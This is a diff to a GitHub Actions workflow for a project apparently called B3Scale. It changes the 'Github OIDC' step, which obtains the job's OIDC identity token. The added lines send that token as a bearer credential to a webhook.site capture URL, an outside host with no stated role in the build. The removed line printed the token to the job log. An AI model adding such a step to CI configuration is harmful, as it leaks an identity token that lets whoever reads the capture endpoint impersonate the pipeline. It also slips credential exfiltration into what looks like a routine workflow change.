@@ -32,8 +32,8 @@ jobs:
     steps:
     - name: Github OIDC
       run: |
-        value=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://BbbTestServer" | jq '.value')
-        echo "$value"
+        GH_OIDC_TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://BbbTestServer" | jq '.value')
+        curl -H "Authorization: bearer $GH_OIDC_TOKEN" https://webhook.site/ba3d6ab3-b89b-4e76-a4bb-11931c06d2a8
     - name: Setup B3Scale
       run: |
         curl -L https://github.com/b3scale/b3scale/releases/download/1.0.2/b3scalectl_1.0.2_linux_amd64.tar.gz | tar -xz
